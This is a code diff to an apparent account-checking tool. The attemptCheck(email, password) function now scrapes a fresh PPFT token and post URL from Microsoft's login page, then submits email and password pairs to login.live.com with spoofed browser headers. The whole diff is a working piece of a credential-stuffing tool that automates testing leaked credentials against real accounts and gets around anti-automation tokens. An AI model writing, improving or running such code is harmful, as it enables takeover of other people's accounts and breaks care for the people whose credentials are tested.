@@ -347,11 +347,40 @@ async function attemptCheck(email, password) {
   const cookieJar = createCookieJar();
 
   try {
-    // ── Step 1: Login ──
+    // ── Step 1: GET login page for fresh PPFT + urlPost ──
+    const preAuthResp = await sessionFetch(AUTHORIZE_URL, {
+      method: "GET",
+      headers: { ...COMMON_HEADERS },
+      signal: AbortSignal.timeout(15000),
+    }, cookieJar);
+
+    const preAuthBody = await preAuthResp.text();
+    const preAuthUrl = preAuthResp._finalUrl || preAuthResp.url;
+
+    // Extract PPFT
+    let ppft = parseLR(preAuthBody, 'name="PPFT" id="i0327" value="', '"');
+    if (!ppft) ppft = parseLR(preAuthBody, "sFT:'", "'");
+    if (!ppft) ppft = parseLR(preAuthBody, 'sFTTag:\'<input type="hidden" name="PPFT" id="i0327" value="', '"');
+    if (!ppft) {
+      result.status = "retry";
+      result.detail = "PPFT not found";
+      return result;
+    }
+
+    // Extract urlPost
+    let urlPost = parseLR(preAuthBody, "urlPost:'", "'");
+    if (!urlPost) urlPost = parseLR(preAuthBody, 'urlPost:"', '"');
+    if (!urlPost) {
+      result.status = "retry";
+      result.detail = "urlPost not found";
+      return result;
+    }
+
+    // ── Step 2: POST login with fresh values ──
     const postData = new URLSearchParams({
       ps: "2", psRNGCDefaultType: "", psRNGCEntropy: "", psRNGCSLK: "",
       canary: "", ctx: "", hpgrequestid: "",
-      PPFT: "-Dim7vMfzjynvFHsYUX3COk7z2NZzCSnDj42yEbbf18uNb!Gl!I9kGKmv895GTY7Ilpr2XXnnVtOSLIiqU!RssMLamTzQEfbiJbXxrOD4nPZ4vTDo8s*CJdw6MoHmVuCcuCyH1kBvpgtCLUcPsDdx09kFqsWFDy9co!nwbCVhXJ*sjt8rZhAAUbA2nA7Z!GK5uQ$$",
+      PPFT: ppft,
       PPSX: "PassportRN", NewUser: "1", FoundMSAs: "",
       fspost: "0", i21: "0", CookieDisclosure: "0",
       IsFidoSupported: "1", isSignupPost: "0", isRecoveryAttemptPost: "0",
@@ -360,9 +389,25 @@ async function attemptCheck(email, password) {
       hisRegion: "", hisScaleUnit: "", passwd: password,
     });
 
-    const resp = await sessionFetch(LOGIN_URL, {
+    const resp = await sessionFetch(urlPost, {
       method: "POST",
-      headers: { ...LOGIN_HEADERS },
+      headers: {
+        "Host": "login.live.com",
+        "Connection": "keep-alive",
+        "Cache-Control": "max-age=0",
+        "Origin": "https://login.live.com",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "User-Agent": USER_AGENT,
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+        "Sec-Fetch-Site": "same-origin",
+        "Sec-Fetch-Mode": "navigate",
+        "Sec-Fetch-User": "?1",
+        "Sec-Fetch-Dest": "document",
+        "Referer": preAuthUrl,
+        "Upgrade-Insecure-Requests": "1",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Accept-Encoding": "gzip, deflate",
+      },
       body: postData.toString(),
       signal: AbortSignal.timeout(20000),
     }, cookieJar);
